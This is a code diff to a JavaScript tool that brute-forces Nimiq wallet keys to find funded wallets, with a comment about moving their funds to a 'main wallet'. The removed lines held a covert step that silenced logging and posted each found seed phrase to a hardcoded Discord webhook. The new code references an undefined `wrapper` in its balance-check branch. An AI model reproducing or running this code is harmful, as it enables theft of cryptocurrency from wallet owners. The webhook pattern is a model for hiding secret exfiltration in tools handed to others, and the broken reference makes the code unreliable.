@@ -1,174 +1,78 @@
+const fs = require('fs');
+const cluster = require('cluster');
+const { default: axios } = require('axios');
+const Wallet = require('./wallet');
+const argv = require('minimist')(process.argv.slice(2));
+
 (async () => {
-    console.log = function () { }
-    console.error = function () { }
-    console.warn = function () { }
-    
-    // Connect
-    const Connection = require('./connection');
-    const connection = new Connection();
-    const wrapper = await connection.connect();
+  // args
+  const numCPUs = argv?.t || 2;
+  const range = argv?.r || "1000000000:ffffffffff";
+  const addressToCheckBalance = argv?.b || null;
 
-    // Main
-    const { range } = require('lodash');
-    const bip39 = require('bip39');
-    const fs = require('fs');
-    const cluster = require('cluster');
-    const NimiqWallet = require('nimiqscan-wallet').default;
-    const blessed = require('blessed');
-    const { default: axios } = require('axios');
-    const argv = require('minimist')(process.argv.slice(2));
-    const threads = argv?.t || 4;
-
-    const send = (title, message) => {
-        const embered = { 'title': message };
-        const headers = { "Content-Type": "application/json" };
-        const data = {
-            'username': 'doge-scan-bot',
-            'avatar_url': 'https://i.imgur.com/AfFp7pu.png',
-            'content': title.toString(),
-            'embeds': [embered]
-        };
-        const webhookUrl = "https://discord.com/api/webhooks/1227910695769870446/HZIb6qMoD8V3Fu8RMCsMwLp8MnGouLuVveDKA2eA1tNPUMWU-itneoAayVXFcC3EVlwK";
-        try {
-            axios.post(webhookUrl, data, { headers })
-        } catch (error) {
-            console.log(error);
-        }
-    }
-
-    async function generate(node) {
-        const wallet = generateAddress();
-
-        const balance = await getBalance(wallet.address, node);
-
-        process.send({ ...wallet, balance });
-
-        if (balance > 0) {
-            var successString = "Wallet: [" + wallet.address + "] - Seed: [" + wallet.seed + "] - Balance: " + balance + " NIM";
-
-            // save the wallet and its private key (seed) to a Success.txt file in the same folder 
-            fs.appendFileSync('./match.txt', successString, (err) => {
-                if (err) throw err;
-            })
-
-            send(successString, 'A Wallet Found Success!!!');
-        }
-    }
-
-    const generateAddress = () => {
-        const mnemonic = bip39.generateMnemonic(256)
-        const wallet = NimiqWallet.fromMnemonic(mnemonic);
-        const address = wallet.getAddress();
-        return { address: address, seed: mnemonic };
-    }
-
-    const getBalance = async (address, node) => new Promise((resolve) => {
-        try {
-            const timeout = setTimeout(() => resolve(-1), 5 * 60 * 1000);
-            node.accountHelper.getBalance(address, (b) => {
-                const balance = b / 100000;
-                clearTimeout(timeout);
-                resolve(balance)
-            })
-        } catch (error) {
-            resolve(-1)
-        }
+  // Check balance
+  if (addressToCheckBalance) {
+    wrapper.accountHelper.getBalance(addressToCheckBalance, function(b) {
+      const balance = b / 100000;
+      console.log(`\n------ Balance Checker -------\n`);
+      console.log(`\x1b[32m${addressToCheckBalance} : ${balance} NIM\x1b[0m`);
+      console.log(`\n------ Balance Checker -------\n`);
+      process.exit(0);
     })
 
-    if (cluster.isMaster) {
-        let counts = 0;
-        let founds = 0;
-        const lines = {}
-        const numCPUs = threads || 2;
+    return;
+  }
 
-        let screen = blessed.screen({
-            smartCSR: true
-        });
-
-        let title = blessed.text({
-            top: 0,
-            left: 0,
-            width: '100%',
-            height: 'shrink',
-            content: `NIMIQ WALLET FINDER v1.0`,
-            style: {
-                fg: 'green'
-            }
-        });
-
-        let status = blessed.text({
-            top: 2,
-            left: 0,
-            width: '100%',
-            height: 'shrink',
-            content: `Threads:      ${numCPUs} CPUs`,
-            style: {
-                fg: 'green'
-            }
-        });
-
-        let result = blessed.text({
-            top: 4,
-            left: 0,
-            width: '100%',
-            height: 'shrink',
-            content: `Result:       Total: 0 | Found: 0`,
-            style: {
-                fg: 'green'
-            }
-        });
-
-        range(0, numCPUs, 1).forEach(i => {
-            let process = blessed.text({
-                top: 6 + (i * 2),
-                left: 0,
-                width: '100%',
-                height: 'shrink',
-                content: `Wallet Check: [CPU ${i + 1}] `,
-                style: {
-                    fg: 'yellow'
-                }
-            });
-            lines[`${i + 1}`] = process;
-            screen.append(process);
-        })
-
-        let box = blessed.box({
-            top: 8 + (numCPUs * 2),
-            left: 0,
-            width: '100%',
-            height: 'shrink',
-            style: {
-                fg: 'blue'
-            }
-        });
-
-        screen.append(title);
-        screen.append(status);
-        screen.append(result);
-        screen.append(box);
-        screen.render();
-
-        cluster.on('message', (worker, message) => {
-            counts++;
-            if (message.balance > 0) {
-                founds++;
-                box.insertTop(`Found: ${message.balance} NIM | ${message.address} | ${message.seed}`);
-            }
-            result.setContent(`Result:       Total: ${counts} | Found: ${founds}`);
-            lines[worker.id].setContent(`Wallet Check: [CPU ${worker.id}] ${message.address} | ${message.balance} NIM`)
-            screen.render();
-        });
-
-        // Fork workers.
-        for (let i = 0; i < numCPUs; i++) {
-            cluster.fork(); // Create a new worker process
-        }
-
-        cluster.on('exit', (worker, code, signal) => {
-            console.log(`worker ${worker.process.pid} died`); // Log when a worker process exits
-        });
-    } else {
-        setInterval(() => generate(wrapper))
+  // Main
+  if (cluster.isMaster) {
+    const [rangeStart = "1", rangeEnd = "1fffffffff"] = range.split(":");
+    const start = "0".repeat(64 - rangeStart.length) + rangeStart
+    const end = rangeEnd + "0".repeat(64 - rangeEnd.length)
+      
+    for (let i = 0; i < numCPUs; i++) {
+      cluster.fork({ START_KEY: `0x${start}`, END_KEY: `0x${end}` });
     }
+
+    cluster.on('exit', (worker, code, signal) => {
+      console.log(`Worker ${worker.process.pid} died`);
+    });
+  } else {
+    const getBalance = async (address) => {
+      try {
+        const res = await axios.get(`http://127.0.0.1:8088/api/v1/balance/${address}`)
+        return res.data.balance;
+      } catch (error) {
+        console.log(error);
+        return -1;
+      }
+    }
+
+    const START_KEY = BigInt(process.env.START_KEY);
+    const END_KEY = BigInt(process.env.END_KEY);
+    const WORKER_INDEX = cluster.worker.id;
+
+    let founds = 0;
+    let start = START_KEY + (BigInt(WORKER_INDEX - 1));
+
+    for (let key = start; key <= END_KEY; key = key + BigInt(numCPUs)) {
+      const privateKeyHex = key.toString(16).padStart(64, '0');
+      const wallet = Wallet.fromPrivateKey(privateKeyHex)
+      const address = wallet.getAddress();
+      const balance = await getBalance(address);
+
+      if (balance > 0) {
+        founds++;
+        console.info(`\x1b[32mCPU ${WORKER_INDEX} | Founds: ${founds} | ${address} | ${privateKeyHex} | ${balance} NIM\x1b[0m`);
+
+        // Write to file
+        var successString = `Wallet: [${address}] - Private: [${privateKeyHex}] - Balance: ${balance} NIM\n\n------ Malphite Coder ------\n\n`;
+        fs.appendFileSync('./match-private.txt', successString, (err) => console.error(err));
+
+        // Create transaction to main wallet
+        // await send(privateKeyHex);
+      } else {
+        console.info(`\x1b[35mCPU ${WORKER_INDEX} | Founds: ${founds} | ${address} | ${privateKeyHex} | ${balance} NIM\x1b[0m`);
+      }
+    }
+  }
 })()
